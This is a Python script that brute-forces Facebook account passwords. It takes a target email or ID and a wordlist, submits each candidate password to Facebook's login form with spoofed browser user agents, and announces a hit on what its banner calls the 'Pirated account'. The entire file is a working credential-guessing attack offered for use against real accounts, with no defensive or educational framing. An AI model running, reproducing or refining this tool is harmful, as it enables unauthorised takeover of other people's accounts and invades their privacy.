#!/usr/bin/env python
# -*- coding: UTF-8 -*-

import sys
import mechanize
import cookielib
import random
import os


os.system("clear")
email = str(raw_input("[?] Press Enter For (ID - Email - number): "))


passwordlist = str(raw_input("[?] Press Enter the wordlist : "))


login = 'https://www.facebook.com/login.php?login_attempt=1'


useragents = [('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36')]

useragents = [('Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36')]

useragents = [('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36')]

useragents = [('Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36')]

def main():
	global br
	br = mechanize.Browser()
	cj = cookielib.LWPCookieJar()
	br.set_handle_robots(False)
	br.set_handle_redirect(True)
	br.set_cookiejar(cj)
	br.set_handle_equiv(True)
	br.set_handle_referer(True)
	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
	welcome()
	search()
	print("[!] Password list does not exist wordlist")

	
	
def brute(password):
	sys.stdout.write("\r[*] password incorrect ===> {}\n".format(password))
	sys.stdout.flush()
	br.addheaders = [('User-agent', random.choice(useragents))]
	site = br.open(login)
	br.select_form(nr = 0)
	br.form['email'] = email
	br.form['pass'] = password
	sub = br.submit()
	log = sub.geturl()
	if log != login and (not 'login_attempt' in log):
			print("\n\n[+] Password Find = {}".format(password))
			raw_input("ANY KEY to Exit....")
			sys.exit(1)

			
def search():
	global password
	passwords = open(passwordlist,"r")
	for password in passwords:
		password = password.replace("\n","")
		brute(password)

		
#welcome 
def welcome():
	wel = """
	
	
██╗███╗░░░███╗██╗░░░██╗██╗░░██╗██╗░░██╗
██║████╗░████║██║░░░██║╚██╗██╔╝╚██╗██╔╝
██║██╔████╔██║██║░░░██║░╚███╔╝░░╚███╔╝░
██║██║╚██╔╝██║██║░░░██║░██╔██╗░░██╔██╗░
██║██║░╚═╝░██║╚██████╔╝██╔╝╚██╗██╔╝╚██╗
╚═╝╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝\n
"""
	total = open(passwordlist,"r")
	total = total.readlines()
	print wel 
	print("+===============================================+")
	print " [#] Pirated account : {}".format(email)
	print " [#] capacity :" , len(total), "passwords"
	print " [#] Cracking, please wait For sec..."
	print("+===============================================+")
	print("\n")
	
if __name__ == '__main__':
	main()


